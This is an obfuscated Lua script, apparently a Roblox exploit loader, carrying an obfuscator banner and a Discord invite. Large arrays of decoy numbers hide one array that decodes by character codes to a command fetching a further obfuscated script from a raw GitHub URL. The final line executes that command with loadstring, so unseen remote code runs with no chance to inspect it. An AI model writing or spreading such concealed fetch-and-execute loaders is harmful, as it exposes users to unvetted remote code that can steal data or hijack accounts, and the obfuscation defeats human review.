--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          _____                    ____________________    __                              
         /     \ _______   ____   /   _____/\_   _____/  _/  |_  ______                    
        /  \ /  \\___   \ /  _ \  \_____  \  |    __)_  \   __\/  ___/                    
       /    Y    \/    / (  <_> ) /        \ |        \  |  |  \___ \                     
       \____|__  /_____ \ \____/ /_______  //_______  /  |__| /____  >                    
               \/      \/                \/         \/            \/                     

	Discord: https://discord.gg/VwTM63a38Y
--]]
local lllOO={86,76,109,143,9,74,198,99,251,12,174,68,167,177,24,49,19,184,119,12,216,55,244,89,207,96,107,128};local llllqD={226,184,171,194,150,110,166,245,127,64,0,102,102,42,225,250,160,220,34,141,138,102,116,181,142,235,54,97,5};local II9dM={180,98,192,241,232,98,35,89,240,2,223,77,151,197,151,230,149,0,23,119,37,90,152,193,196,195,199,175,38,1,3,150,193,116,104,134,26,72};local llVE={71,249,75,126,112,93,198,100,62,170,200,113,14,248,112,169,36,63,217,81};local It={66,193,169,67,57,204,188,111,252,192,78,242,210,171,78,159,108,85,167,242,230,4,242,59,198,112,168,52,190,111,213};local llllxmr={131,94,35,27,219,93,136,115,82,45,79,140,138,178,27,164,21,161,10,171,131,23,102,170,226,102,158,215,16,51,219,40,50,69,213,28,213,108,72,231,105,181,134,239,59,74,29,215};local IpLB={234,173,208,228,139,154,223,140,67,9,89,174,141,104,13,71,36,128,4,12,200,142,5,184,207,18,55,91,142,113,228,212,20,143,144,46,189,98,22,183,238,206};local llgV={205,254,22,212,134,165,182,173,151,181,47,157,176,123,105,57,241,68,190,120,62,251,247,88,131,163,84,231,241,231,158,7,177,146,42,134};local ll6Xi={215,190,152,233,47,184,168,53,43,236,33,168,105,98,18,100,145,97,2,121,171,159,201,100,250,118,13,52,219,242,140,203,187,150,108,170,7};local Ic={99,207,158,150,126,15,170,126,2,203,218,32,6,157,56,215,199,3,124,208,175,238,57,112,97,80,241,0,107,117,54,251,87,179,83,165,198,31,54,50,91};local llll3O={53,131,232,229,109,231,113,143,231,66,33,165,37,42,102,57,170,198,65,91,158,175,102,186,143,139,38,251,38,155,69,228,154,184,72};local lllZ={82,225,67,179,23,90,206,226,141,250,192,77,178,243,222,28,163,124,43,49,122,149,179,119,221,215,249,176,116,14,99,105,91,63,0,194,57,183,233,21,160,220,103,172,127,124,173};local lCp={239,222,172,19,119,205,168,16,228,109,43,234,209,140,66,233,237,111,180,205,96,86,190,147,215,154,243,139,25,106,194,194,30,165,215,40,102,240,33};local lDu={36,29,170,5,25,225,207,34,21,177,103,114,29,154,54,174,234,79,84,52,65,76,72,159,2,95,196,16,248,244,212,36,0,137,132,202,214,33,9,129,252,106,16,62,202};local IIS={254,174,23,80,12,219,175,217,43,219,169,101,219,152,221,180,11,252,70,10,153,158,86,175};local llllUpV={234,172,128,42,1,245,148,212,118,106,15,67,162,172,106,225,136,0,2,88,229,229,13,91,120,254,211,229,84,197,181,184,6,83,137,92,82};local IIEu={28,20,200,145,91,201,37,137,87,121,222,129,223,218,241,42,74,22,155,11,254,98,3,12,4,8,30,137,181,194,242,169,50,177,90,211,154,8};local IL={161,199,157,209,147,129,210,47,235,110,104,237,233,243,222,9,176,21,183,129,16};local In={169,191,119,244,146,115,158,247,242,250,135,64,110,16,158,146,158,25,96,242,184,32,161,128,143,24,140,77,185,239,81,6,62,134,127,15,89,32};local llY={83,209,137,200,130,12,118,222,174,99,216,227,228,162,145,106,97,110,11,119,111,128,9,201,189,89,26,211,12,88,60,109,208,221,73,44,7,153,5};local IW={4,209,228,41,169,67,19,34,132,167,25,106,191,98,217,115,91,205,244,3,34,41,36,217,3,247,232,87,68,210,184,130,41,86,42,160,58};local IIIv8={62,231,227,191,22,63,195,193,229,13,201,38,22,31,31,204,60,38,125,182,117,217,49,234,202,1,152,39,98,102,59,84,175,181,188,236,182};local lllly={95,234,171,19,52,75,33,2,157,148,153,130,202,143,1,102,26,138,50,178,190,122,253,213,67,53,3,242,207,10};local IIIYc={43,64,248,243,120,82,149,164,121,245,154,207,124,17,33,23,133,102,11,165,237,187,132,206,38,38,98,93,191,203,208,221,58,39,225,99,150,32};local lqb={216,74,200,192,27,60,213,45,25,54,82,22,72,68,67,23,116,102,116,130,127,112,125,138,234,137,194,39,206,249,171,145,185,120,100,64,131,147,75,61,197,47,132,189,45,136};local lcv={154,184,0,181,119,230,238,187,102,188,211,176,92,85,79,254,93,27,246,119,26,13,5,151,204,69,150,4,18,28,170,84,149,57,23,164,53,132,132,182,90,8,126,25};local III4L={71,151,99,249,65,147,209,247,213,113,98,168,35,181,170,166,136,15,129,9};local llb={54,220,121,203,102,91,121,207,254,112,34,120,198,233,252,83,65,231,213,183,58,141,11,28,8,102,19,47,83,228,120,245,134,91,52,43,228,12,240,234,3,195};local lll3i={43,23,23,148,70,80,112,62,75,198,84,233,62,105,241,52,103,116,233,43,42,150,40,98,225,169,44,250,178,23,19,37};local IIIjsd={106,226,1,87,208,105,15,138,0,157,131,166,249,98,129,198,102,137,241,55,227,35,174,86,57,51,67,228,151,20,200,6,15,136,151,50,192,189,42,95,64,129};local lpz2={102,134,102,133,185,109,130,236,214,220,153,216,95,30,119,239,31,200,168,157,133,235,252,129};local IINW5={137,193,60,39,194,112,251,77,151,159,133,195,78,49,9,72,23,176,159,254};local IIIc={77,90,35,223,182,85,68,216,158,49,72,190,211,251,167,147,202,132,248,163,228,56,215,49,33,42,89,21,241,239,244,100,10,99,70,170,230,104,118,120,61,129};local IID={222,19,169,89,93,140,176,211,2,195,63,115,155,40,96,75,114,73,206,175,110,192,6,254,237,245,30,161,142,206,62,158};local ll2Q={236,110,109,189,248,7,230,232,252,100,131,187,152,46,10,140,213,91,70,106,92,171,105,113,165,166,56,76,35,29,132,187,181,136,3,119,200,205,228,179,115,106,154,56,251,8};local IK={34,137,43,209,57,118,42,120,23,130,201,70,141,32,30,194,164,42,181,3,75,121,166,98,97,74,224,225,226,87,232,0,112,223,228,13,209,250};local llllS={122,219,171,194,3,116,177,52,205,246,196,0,145,127,112,132,201,47,157,206,212,198,179,16,28,154,242};local IIY={60,10,69,150,238,229,191,253,140,48,9,68,133,133,181,254,99,151,24,145,67,35,76,103,200,102,213,192,129,230,197,27,20,25,36,15,54,90,45,161,134,84,19};local lll7q={156,166,42,253,212,195,52,14,242,114,202,211,88,49,54,149,75,194,225,250,32,53,207,208,59,160,214,177,9,81,87,184,88,61,164,72,164,104,105,66,14,98,95,242,218,148,63,148};local ID={30,203,189,220,208,15,83,42,51,54,46,92,121,237,8,129,115,41,101,73,238,194,104,210,101,106,96,110,153,124,214,113,188,153,56};local llTLR={127,176,19,34,149,176,222,42,233,173,142,249,133,14,60,122,21,5,20,86,31,9,72,117,53,218,155,189,201,157,48,89,9,51,10,140,210,69,15,142,58,15,107,10,127,244,169};local lllGdp={227,112,247,220,135,169,106,88,122,44,197,216,24,89,147,128,215,229,156,122,173,0,216,221,238,187,82,138,14,41,42,53,202,0,132,183};local llllTK={227,228,219,107,155,245,115,214,220,1,209,21,45,140,14,128,143,88,28,147,243,13,242,105};local lfvS={212,234,242,79,145,36,198,192,159,69,152,115,74,119,78,185,104,143,5,205,99,184,250,80,116,36,0,235,163,17,107,39,162,72,100,11,242};local lllD={234,235,43,253,19,161,153,18,32,237,125,185,136,16,237,113,109,26,203,156,17,41,212,146,10};local ImD={35,47,164,91,202,160,218,73,171,35,133,125,44,39,110,89,54,25,22,75,204,154};local llll0E9={8,103,170,113,42,11,198,214,2,117,132,45,231,26,246,213,15,202,136,68,94,202,154,170,5,31,44,248,218,163,113,233,147,14,18,217,59,44,29,189,226,71,35,79,85,163};local llllN={168,212,161,226,209,1,247,26,152,134,43,166,78,159,60,42,240,119,12,242,109,150,72,48,174,247,207,68,102,218,218,119,64,211};local lllx={119,26,175,188,210,94,248,107,224,175,72,48,44,228,157,125,233,172,201,123,138,50,6,136,188};local IIf={188,220,252,162,9,30,198,103,139,172,152,248,158,114,254,225,116,186,23,70,101,56,104,72,195,218,8,204,113,224,154,25,73,115,6,139,209,24,109,251,108,40};
local llP=448;local IIIawM=llP+48;local llllw=408;local lllKiR=llllw+1;local IIIt=128;local lnr=IIIt+57;local IIdB=310;local llD=IIdB+47;local IIIOv=879;local l1J=IIIOv+84;local llNJ=340;local I0JY=llNJ+44;local lhXh=8;local lKfi=lhXh+83;local lOf=931;local IIIXFf=lOf+79;local lll257=742;local IIII=lll257+19;local IIIDB=321;local III1xm=IIIDB+16;local IIIo0=659;local IuS5=IIIo0+18;local llNZq=329;local l7wS=llNZq+56;local lllly=925;local llugA=lllly+48;local lyyq=207;local lllaH0=lyyq+0;local IIX=997;local IIxy=IIX+17;local l3=760;local llWv=l3+73;local lllcO=277;local III8b=lllcO+95;local Ic4=802;local lli=Ic4+18;local llSF=482;local llu=llSF+32;local IIVnQ=907;local l4N=IIVnQ+15;local IIIOz=977;local lllli2H=IIIOz+76;local llllbX=62;local IItT=llllbX+53;local lE=576;local lb=lE+32;local lla5=618;local III9=lla5+39;local IIV=766;local llll0=IIV+57;local llllFR4=48;local I5o=llllFR4+27;local lv=707;local lfi=lv+24;local IIv=611;local IIIk=IIv+1;local IIIV=500;local lllP=IIIV+64;local II5dA=209;local IIM9=II5dA+84;local IIIz=103;local IIIlcf=IIIz+67;local II=203;local III1=II+5;local lluf=476;local l8=lluf+92;local IIII=370;local IIIhA2=IIII+54;local IIF=696;local llllAb=IIF+75;local IIIAi=591;local lllY=IIIAi+75;local lllg3=440;local III99=lllg3+66;local lllFM=562;local llv=lllFM+24;local llSe=177;local lllj4=llSe+88;local IF=133;local llllsph=IF+48;local IGB=769;local lllGc=IGB+69;local IIIpS=413;local IIIOZ=IIIpS+25;local llZgh=99;local llfTY=llZgh+2;local III3=934;local IIs=III3+67;local ll0=621;local IIIpT=ll0+16;local IImYw=987;local llllpW=IImYw+85;local lld4O=420;local Il=lld4O+69;local llllmI=368;local I5=llllmI+33;local Ic=292;local llllW=Ic+94;local llllmG4=353;local IIIkEG=llllmG4+97;
local lllJ,lllljr=string.char,table.concat;
local llll0={116,153,9,124,232,72,26,60,71,158,243,254,249,226,69,52,225,53,145,171,237,90,100,86,214,4,117,166,49,200,187,174,222};local lnUU={73,97,57,141,121,139,217,107,70,128,20,129,135,2,125,183,109,227,238,136,140,239,157,51,138,162,248,175,238,193,131,81,81,241,75,63,225,230,250,160,81,223};local lllbUV={7,196,139,38,132,1,82,129,32,135,71,209,86,208,173,237,123,220,14,61,155,102,206,52,33,190,188,105,83,127,176,233,135};local lllVv={168,109,235,63,107,158,193,46,109,140,13,78,5,173,31,236,198,49,65,210,117,40,200,239,224,213,144,198,214,214,235,223,253,15,213,189,246,205,184,80,215,103};local IIIqm={150,187,185,14,151,191,4,228,85,243,17,0,229,177,246,194,131,85,202,163,198,193,89,228,85,16,198};local I7={247,244,125,20,193,4,246,137,96,59,108,238,88,67,240,62,4,84,75,63,209,137,121,126,153,83,95,161,197,210};local IIIoK={52,78,89,32,96,123,167,84,47,225,126,196,172,233,138,183,242,12,205,135,230,152,171,30,85,1,251,208,83,188,171,219,245,231,130,207,172,99,87};local llln={245,124,20,160,186,220,247,64,160,238,188,45,50,150,63,146,189,159,129,122,34,244,28,49,181,2,113,122,64,39,85,18,243,12,87,67,13,205,75,42,192,29,5,0,63,190};local lllSIv={61,129,47,117,89,148,31,5,146,218,91,69,115,122,51,161,65,213,19,20,99,254,47,168,44,176,154,210,96,120,94,39,194,97,53,67,100,69,102};local lL={59,25,234,123,81,250,250,102,47,73,153,142,100,191,220,210,106,37,11,15,118,82,139,38,49,25,14,233,27,92,35,59,207,230,114};local lDU={149,168,221,153,150,87,108,116,214,240,192,137,213,227,241,67,99,153,25,239,169,172};local IPo2={213,209,113,191,208,42,223,82,67,194,84,197,169,47,191,151,232,189,38,118,223,33,40,43,105,48,175,78,89,205,38,90,116,157,241,136,31,143,115,169,224,170};local lr={29,104,59,89,175,45,239,39,143,3,213,3,31,153,210,86,53,36,252,50,176,133,201,150,164,137,140,97};local lllx={19,61,142,208,54,186,215,210,118,81,118,13,221,124,197,201,97,249,195,78,29,67,166,133,118,124,26,247,119};local lllGlE={91,45,91,13,187,170,26,101,5,189,142,48,193,98,44,58,101,24,176,84,166,220,34,115,173,122,123,134,145,209,84,19,190,12,151,21,158,111,124,117,27,122,65,242,18};local IIGD={237,9,197,41,240,205,111,234,236,200,228,77,190,176,81,154,137,206,201,216,156,101,88,204,249,67,66,13,134,55,233,142,125};local III5O={171,67,10,203,180,107,180,90,16,54,215,19,39,133,217,132,134,177,129,0,253,244,67,130,250,213,191,88,24,91,112,40,47,111};local ll9Ue={205,235,184,50,187,60,128,125,53,21,214,130,47,7,7,36,30,37,166,136,77,42,125,169,223,231,40,118,125,96,209,4,207,74,240,252,4};local lloy={58,81,143,138,123,221,150,32,70,157,239,122,245,43,71,151,33,75,139,19,232,31,11,16,18,123,33,247,116,1,59,148,131,158,70,158,3,84};local IIU={24,6,12,244,44,137,121,246,117,19,2,195,168,181,57,43,198,9,107,197,52,180,7,97,101,179,8,224,22,229,132,109,86,52,51,99,18,138,54,216,138,32,190};local llllC7L={160,131,113,182,153,56,158,7,149,11,210,234,16,253,222,219,157,71,139,184,89,212,123,61,137,217,134,135,101,218,14,86,70};local lU={103,133,146,73,217,92,202,204,154,0,195,123,92,103,154,98,71,170,251,35,17,48,145,57,52,20,101,199,56,172};local llllsv={23,87,222,86,8,85,237,166,133,193,229,33,65,234,49,51,114,75,84,201,232,51,31,96,62,181,68,122,52,211,252,208,185,53,48,162,219};local Ibf={7,223,185,156,24,59,36,211,221,48,25,157,243,69,191,21,225,111,220,80,108,126,0,132,250,195,167,214,233,193,196,217,94,168,254,37,190,6,152,42};local III83={182,156,237,192,230,45,131,117,111,33,136,242,144,230,239,33,1,110,133,218,154,167,94,208,209,221,225,143,234,182,55,142,187,141,153,94,84,198,224,11,6,50,42,39,105,250};local IC={64,14,251,212,135,104,81,119,246,191,102,26,212,208,61,175,220,20,207,90,126,250,101,131,236,195,136,72,96,145,193,214,54,118,235,146,199,216};local ls85={228,13,55,114,143,29,54,190,108,105,148,166,19,19,235,166,139,226,247,6,245,100,181,37,103,204,54,20,186};local IIIgrC={194,3,184,147,36,91,167,136,155,77,56,0,49,207,194,202,153,38,31,139,230,233,106,90,248,21,113,46,193,104,47,102,172,216,167,210,50,11,186,24,205,162};local Ir={100,133,27,227,173,232,156,93,58,142,162,57,7,198,202,111,153,46,136,149,16,133,48,102,122,84,132,240,129,72,196,195,218,81,17,235,44,92,153,101,252,197,216,88,238};local lllxNC={70,190,164,6,155,150,119,182,246,128,131,206,120,11,206,223,112,84,103,97,8,28,160,167,218,46,225,136,170,205,126,66,183,239,222,249,9,22,121,223,70,152,49,236,183,38,42,119,104};local Iu={175,247,175,221,51,18,190,193,115,155,81,194,47,228,51,254,113,179,47,16,82,123,212,42,172,30,69};local Icfn={143,103,209,191,166,194,52,32,146,43,248,55,67,156,145,126,175,27,66,60,209,45,45,108,186};local llw={207,246,64,66,116,25,101,98,44,84,45,140,93,240,152,129,187,161,254,101,147,84,246,123,201,17,223,48,203,130,109,2,37,27,167,64,227,166};local ll1={203,92,49,254,155,109,23,121,214,225,206,133,168,153,134,178,201,60,200,115,166,31,77,158};local lvV={62,187,190,186,81,59,168,139,99,123,185,184,71,185,230,246,117,34,140,207,54,94,8,50,96,91,53,19,136,56,190,200,250,127,9,250,118,254,199,49,90};local laUT={177,129,145,155,8,193,60,170,149,60,41,92,92,171,19,249,110,206,166,217};local IoR={147,167,30,122,139,123,158,114,102,77,23,220,37,63,58,32,69,208,219,177,183,204,28,8,235};local ITl={149,106,114,115,221,177,150,46,139,39,47,145,220,202,44,16,8,209,6,227,101,211,47,174,138,26,84,233,91,48};local lB3={141,200,127,122,62,220,123,4,0,206,102,225,197,16,211,49,156,219,63,140,23,52,116,86,224,142,82,210,51,162,114,181,94};local IIId={169,180,161,29,151,205,180,41,192,166,200,17,56,208,169,247,239,185,233,240,79,233,62,204,8,252,31,191,112,174,27,153,77,98,142,13,174,99,178,13,164,156,253,28};local IIIpd8={67,251,4,79,89,203,81,71,172,137,11,57,173,98,187,243,229,239,203,205,139};local llll5A8={92,35,234,158,82,117,159,220,191,3,219,103,10,49,112,240,84,144,73,105,181,160};local lllR={225,36,241,237,233,214,242,192,61,10,59,140,181,182,170,221,94,35,58,174,125,185,58,205,168,161,183,178,106,12,235,176,185,240,69,56,9};local llllat={220,151,223,83,183,227,68,216,9,19,104,100,137,23,51,243,209,58,120,23,175,116,222,122,160,222,157,30,192,169,193,34,189,242,131,119,164,31,228,225,200,133};local II3c={236,74,213,60,73,52,3,89,71,93,142,222,69,200,111,101,72,240,140,236,213,115,163,119,182,238,66,248,220,163,18,114,92,231,112,65,56,121,48,8,168,150,183,248,19,172,16,75};local Il1={118,220,75,238,18,123,95,87,51,98,192,2,38,200,188,127,50,135,160,252,199,183,251,131,197,127,223,92,172,224,180,181,210,128,141,250,8,12,64,98,252,124,252,242,195,23};local lmYe={175,30,103,30,122,81,220,57,223,160,73,98,248,202,41,88,69,61,53,145,43,135,164,252,237,159,150,132,167,91,70,200,5,20,137,144,69};local II9TP={63,44,103,233,92,155,122,160,22,179,225,182,72,173,204,53,109,1,14,0,8,128,0,174,194,39,91,21,82,223,132,190,1,111,235,58,33,18,216,147};local IIIy={41,248,54,46,68,161,162,90,163,58,180,58,54,137,46,209,240,245,2,212,160,108,53,225,44,186,156,103,115,204,151,33,181,156,16,118,249,11,197,230,95,252};local liF9={200,223,121,214,251,136,37,124,56,2,79,182,150,65,251,210,221,26,107,164,229,178,38,155,22,141,59,95,77,47,212,69,229,63,190};
local llff={108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,99,114,105,112,116,45,68,101,118,101,108,111,112,101,114,47,45,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,111,98,102,117,115,99,97,116,101,100,95,49,55,54,48,52,49,56,55,50,55,49,52,57,46,108,117,97,46,116,120,116,34,41,41,40,41};
local lll7=806;local lllmRC=lll7+95;local lllle=882;local IhRN=lllle+21;local ll4=94;local lBL=ll4+40;local lllaVk=395;local IIu=lllaVk+34;local llldW=95;local IIsly=llldW+75;local lyr=356;local IIY=lyr+37;local Ix=398;local lllk95=Ix+11;local IIIj=498;local IGk=IIIj+93;local llD6=37;local IIIO=llD6+29;local lllQ=263;local lllCsM=lllQ+26;local llllYv=923;local ll1=llllYv+74;local III9=169;local lwcL=III9+68;local IIIM7k=303;local IIIWp=IIIM7k+45;local lllr0=411;local laM=lllr0+41;local l6=18;local lll8C=l6+12;local Iwb=69;local III7=Iwb+0;local ll8=32;local l9tj=ll8+2;local lBC=923;local llL=lBC+47;local llQJf=25;local lllI1A=llQJf+72;local lW=308;local IInrF=lW+75;local lll4=38;local llRo=lll4+65;local In9=962;local lulz=In9+37;local IIIX=359;local llllE=IIIX+61;local lVUw=33;local IIi3q=lVUw+70;local IIIzq9=412;local lyoP=IIIzq9+24;local lXBY=708;local lzv=lXBY+84;local lllct2=51;local IIqp=lllct2+42;local Im=152;local lllv=Im+57;local lll8yN=987;local llllK=lll8yN+16;local Im=592;local IIDTw=Im+34;local IIQDa=526;local lllGnj=IIQDa+7;local lllaE=176;local I7L=lllaE+20;local llll9=644;local lllo=llll9+17;local llllFy=933;local lllnM=llllFy+5;local llllSw=933;local llllcfi=llllSw+88;local lllqNv=139;local III8Np=lllqNv+67;local lllGbh=173;local III4Ol=lllGbh+88;local llll0K=489;local IFV=llll0K+41;local IIIg=916;local llIEm=IIIg+9;local II9=263;local lll2=II9+66;local lr5q=437;local IIIOG=lr5q+8;local llljl=353;local lllFdi=llljl+93;local IE02=473;local llllrXJ=IE02+1;local llRP=177;local lll1PD=llRP+88;local lrEd=752;local I9jG=lrEd+79;local lltu=266;local ll7=lltu+41;local llvQ=285;local llll5=llvQ+20;local llllln=735;local IIv=llllln+42;local ll1=98;local IIIB5=ll1+64;local lllAU=729;local IIIS=lllAU+1;
local lllllC={};
for lllZhj=1,#llff do 
lllllC[lllZhj]=lllJ(llff[lllZhj]);
end;
local IIIpeJ={175,239,129,96,188,104,220,27,202,2,98,213,103,193,99,160,97,69,96,30,31,93,73,30,254,178};local lllTxB={81,236,24,71,237,0,189,28,232,36,169,125,205,168,142,186,203,48,216,46,35,80,254,28,103,153,215,218,251,124,83,49,246,115,49,178,158,212,163,61,142,62,211,58,1,196,9,92,145};local lllb={114,67,85,65,121,91,162,143,199,64,117,134,232,47,68,27,141,227,46,161,124,146,168,137,155,220,216,174,61,25,165,116,254,254,242,112,88,50,177,243,68,101,195,17,99,58};local IIISe={115,116,157,163,230,44,243,95,163,224,80,76,147,45,173,10,213,186,9,80,118,247,61,67,22,152,225,130,70,222,146,84,201,226,237,169,251,243,3,92,223,186,203,247,142,86};local lNT={45,102,34,160,136,82,36,92,241,155,115,12,225,247,123,29,45,172,220,68,203,76,16,146};local llYh={92,98,26,194,154,227,10,229,128,161,191,113,18,31,11,228,136,111,21,143,152,69,113,233,40,115,88,119,251,81,16,48};local l4={187,101,250,189,145,32,158,112,134,134,183,251,33,213,227,189,218,72,235,242,219,221,132,207};local IIIbW={38,206,134,173,118,1,158,216,46,71,184,100,124,23,156,141,129,80,206,252,24,136,12};local IIP={104,123,89,135,201,143,231,70,49,50,82,242,64,20,95,58,47,51,203,5,29,63,166,147,18,201,233,31,4,58};local IIILno={248,63,121,8,196,237,104,69,14,194,16,117,142,180,148,173,92,92,236,247,174,221,205,116,51,81,104,179,31,191};local IIIifK={232,42,36,191,47,132,58,6,84,70,136,249,105,195,74,44,103,73,97,67,20,143,248,13,192,176,140,176,68,200,82,110,212,107,226,23,46,27,89,130,145,217,80,250,207,250,163};local IIIO={94,126,174,97,130,142,96,250,130,128,119,196,202,57,89,170,34,122,197,163,72,126,21,82,148,82,97,126,72,15,127,85,189,11,60,52,163,248,133,156,4,222,207,98};local llFuX={125,10,50,41,216,160,71,196,96,62,96,204,82,39,21,170,76,151,19,7,172,109,29,24,148,154,124,198,19,30,236,172,128,87};local II6={71,196,160,235,131,158,195,125,172,108,112,40,189,165,243,152,232,186,195,117,149,37,30,112,63,240,216,46,71,175,81};local llll5={224,15,66,39,101,209,130,10,4,15,63,77,86,157,18,146,199,55,253,179,112,250,209,197,100,67,113,131,128,55,94,115,120,127,80,83,35,92,146,124,158,139,38,190,195,155,248,171,158};local IIpZ={228,79,158,204,40,50,104,128,186,35,75,85,5,174,45,143,251,138,27,2,221,93,192,188,152,21};local ll2e={155,175,248,168,73,196,15,85,167,28,137,47,35,153,166,33,254,185,221,95,69,235,242,74,212,77,148};local IIIY={76,244,135,195,142,8,229,3,98,187,239,211,82,72,143,55,198,246,99,144,175,176,80,127,226,9,115,220,98,206,131,96,114,215,98,40,119,36,96,77};local IJB={217,102,199,143,186,96,238,142,26,236,218,233,168,243,18,191,111,197,170,91,88,73,229,253,72,158,195,77,238,54,78,223,94,26,143,175,77,209};local lllldIH={19,10,184,221,125,190,78,37,223,62,112,173,163,47,164,155,128,46,249,157,84,110,173,136,50,54,159,101,69,208,88,133,136,68,210,105,88,189,144,30,147,95,140,136};local llci={100,41,231,189,130,154,42,107,116,55,195,70,17,28,107,39,31,206,193,35,228,176,115,79,76,130,188,111};local llli81={192,41,68,168,252,79,40,149,202,112,227,165,217,175,76,101,158,43,5,118,148,112,95,156,98,87,194,12,225,180,3,3,161,123,74,100,78,32,165,15,222};local lw={106,38,14,93,1,162,181,21,39,37,15,232,248,231,227,250,235,80,178,217,135,199,54,208,148,76,72};local llllK={24,92,105,254,188,232,49,166,153,116,141,174,154,18,157,219,207,66,58,241,145,211,39,182,217,116,219,215};local IIIEWD={50,181,230,70,8,28,71,54,154,46,191,32,131,72,231,253,33,227,136,236,217,185,156,22,116,95,208,138,231,202,129};local llve={144,249,95,12,204,250,196,111,132,156,141,32,205,57,214,157,117,167,41,193,254,84,103,172,206,188,32,98,97,160,130,172,202,183,93,166,157,131,138,122,25,250,176,149,60,74};local IDnk={28,150,87,39,170,178,73,77,196,241,239,0,38,227,171,28,181,140,196,189,70,71,94,161,196,87,172,156,213,118};local IIX={194,18,38,121,206,109,32,98,193,97,34,52,203,41,113,89,44,137,206,171,126,150,224,33,10,54,151,86,127};local lllgL5={212,49,148,23,101,211,200,85,91,88,108,57,18,109,191,9,104,57,191,66,186,33,59,25,209,2,23,154,222,136,187,23,182,152,205,61};local llZ0h={179,176,162,234,248,204,126,42,21,164,214,177,223,184,122,231,68,116,83,179,102,56,166,48,143,124};local llllNmK={76,165,128,200,132,13,221,54,230,31,195,49,199,74,148,134,190,7,133,176,252,112,155,171,87,179,199,75,34,23,5,94};local lkN={101,60,67,59,19,73,151,121,20,119,207,179,146,91,195,77,7,186,56,143,246,205,77,206,209,131,8,17};local ll1MJ={82,20,190,226,203,95,37,224,150,217,16,66,247,203,38,35,54,109,207,29,7,228,116,213,231,195,24,237,44,99,138,26,200};local llliQU={85,190,129,57,165,62,204,220,183,203,242,139,64,166,167,67,195,188,214,166,124,208,248,51,199,237,163,48,21,227,249,30,92,187,211,94,14,203,25,238,191,102,196,157,45,215,123};local lllMd={49,6,162,56,218,153,166,120,37,219,220,208,52,104,239,254,105,198,208,99,144,158,160,189,156,113,208,133,245,254,166,103,230,237,99,89,64,177,194,190,101,222,243,224};local IIVd={1,231,164,197,34,46,220,24,226,163,217,13,120,5,159,227,93,159,21,65,200,82,95,242,143,12,47,237,51,173,206,116,190,168,210,88,237,47,28,14};local IIImQw={208,105,5,60,62,157,153,214,89,173,227,167,223,97,42,139,226,79,25,20,186,26,221,34,19,162,8,166,30,86,93,26,63,8,107,47,4,240,139,200,112,233,253,38,36,112,137,152,192};local llllC={75,46,135,143,3,210,219,144,122,141,27,83,242,33,60,220,198,89,126,224,180,132,157,179,250,40,230,173,28,119,45,164,31,25,184,51,51,109,39,188,105,202};local IvU={156,147,184,146,96,66,52,139,189,44,163,154,254,68,94,248,104,124,245,11,209,105,45,224,219,116,107,192,213,174,3,132,52,252,112};local l1={157,187,236,52,18,155,249,199,28,210,120,64,154,167,50,118,137,123,202,252,70,24,188,45,152,99};local III21w={144,121,228,185,44,219,79,237,183,235,57,16,86,173,222,219,107,8,9,105,83,167,71,136,41,146,165,21,240,115,21,8,177,174,118,159,124};local IIf={59,144,107,172,68,5,175,175,199,87,10,27,14,48,138,85,240,91,138,85,138,242,177,197,23,54,186,254,107,199,193,155,24,98,209,176,132,100,105,60,168,8,226};local ll6TD={253,175,158,184,185,251,203,112,133,98,190,236,195,165,161,133,90,54,196,43,103,243,228,62,148,29};local lzy={175,73,116,223,91,176,29,100,189,216,123,226,1,18,44,34,35,46,201,161,68,77,225,222,117,9,201,183,231};local IS5={250,239,240,74,217,122,146,174,241,247,238,219,54,247,194,176,53,198,58,130,167,26,80,12,78,243};local l4wJ={217,136,229,134,157,179,126,17,154,63,224,90,236,1,108,142,250,148,114,56,46,244,110,48,248,119,64,221,140,55,87,94,206,24,230,117,55,99,249,102,127};local lOPa={142,242,37,139,229,237,97,219,1,139,42,228,122,25,105,101,8,86,26,152,109,212,28,161,235,191,125,252,203,225,224,8,94,162,10,135,7,139,15};local lllken={149,62,126,115,101,177,97,222,106,70,199,178,152,222,169,1,109,12,207,215,30,65,242,201,41,127,246,224,157,194,155,248,20,96};local llltMT={238,47,234,38,101,129,206,249,20,90,95,55,186,89,13,163,173,164,184,60,104,2,190,87};local I6C={132,27,108,130,142,154,102,227,57,40,67,4,17,179,156,250,244,245,38,15,45,109,170,117,220,109,219,90,210,58,168,97,44,252,241,78,154,65,26,145,203,150,24,56,128,133,225};
local IIuy=lllljr(lllllC);
(function()return(function()return loadstring(IIuy)()end)()end)()